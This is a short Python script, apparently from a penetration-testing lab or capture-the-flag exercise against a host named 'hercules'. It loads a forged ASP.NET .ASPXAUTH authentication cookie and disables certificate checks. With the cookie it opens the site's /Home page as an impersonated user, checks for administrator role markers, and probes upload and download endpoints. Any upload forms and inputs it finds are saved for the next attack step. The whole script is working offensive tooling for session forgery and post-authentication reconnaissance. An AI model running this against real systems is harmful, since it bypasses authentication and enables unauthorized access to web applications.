#!/usr/bin/env python3
import re
import requests
import urllib3

urllib3.disable_warnings()
BASE = "https://10.129.242.196"
S = requests.Session()
S.verify = False

forged = open("/home/kali/hercules/forged.cookie").read().strip()
S.cookies.set(".ASPXAUTH", forged, domain="10.129.242.196")

r = S.get(f"{BASE}/Home", timeout=15)
print(f"/Home -> {r.status_code} len={len(r.text)}")
print("mentions web_admin:", "web_admin" in r.text)
print("mentions admin role:", "Web Administrators" in r.text)

links = sorted(set(re.findall(r'href="(/[^"]+)"', r.text)))
print("links:", links)

for ep in ["/Home/UploadReport", "/Home/Upload", "/Home/Reports", "/Home/Download"]:
    rr = S.get(f"{BASE}{ep}", timeout=15)
    print(f"{ep} -> {rr.status_code} len={len(rr.text)}")
    if rr.status_code == 200 and "Upload" in rr.text:
        open("/home/kali/hercules/upload_page.html", "w").write(rr.text)
        forms = re.findall(r'<form[^>]*>', rr.text)
        inputs = re.findall(r'<input[^>]*>', rr.text)
        print("  forms:", forms[:3])
        print("  inputs:", inputs[:6])
